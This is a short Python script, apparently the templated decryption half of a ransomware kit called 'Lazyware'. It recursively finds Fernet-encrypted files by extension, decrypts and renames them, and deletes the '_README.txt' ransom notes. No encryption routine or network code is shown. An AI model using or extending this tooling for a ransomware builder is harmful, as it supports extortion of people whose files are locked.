from cryptography.fernet import Fernet
import os 
import base64
import sys
import time
import json

class Lazyware:
	def __init__(self):
		self.file_list = []

		#----------------------------------------Configuration---------------------------------------#
		self.config = {
			"disk": ##disk##, #disk or folder to start encrypt
			"key": "##key##", #key
			"enc_extension" : "##enc_extension##", #change extension the encrypted files
			"file_to_enc": ##file_to_enc## # specific extension to encrypt 
		}
		#--------------------------------------------------------------------------------------------#

		key = self.config['key']
		self.f = Fernet(key)


	def run_dec(self):
		for i in self.file_list:
			self.decrypt(i)

	def get_asset(self):
		for disk in self.config['disk']:
			self.scandisk(disk)

	def scandisk(self, disk):
		obj = os.listdir(disk)
		for asset in obj:
			combine = os.path.join(disk, asset)
			if os.path.isdir(combine):
				self.scandisk(combine)
			else:
				if "_README.txt" in combine:
					os.unlink(combine)
				else:
					extension = os.path.splitext(combine)[1]
					if extension == self.config['enc_extension']:
						self.file_list.append(combine)


	def decrypt(self, file):
		with open(file, "rb") as f:
			data = f.read()
			dec = self.f.decrypt(data)
			open(file, 'wb').write(dec)
		rm_ext = file.rsplit(".", 1)[0]
		os.rename(file, rm_ext)

init = Lazyware()
init.get_asset()
init.run_dec()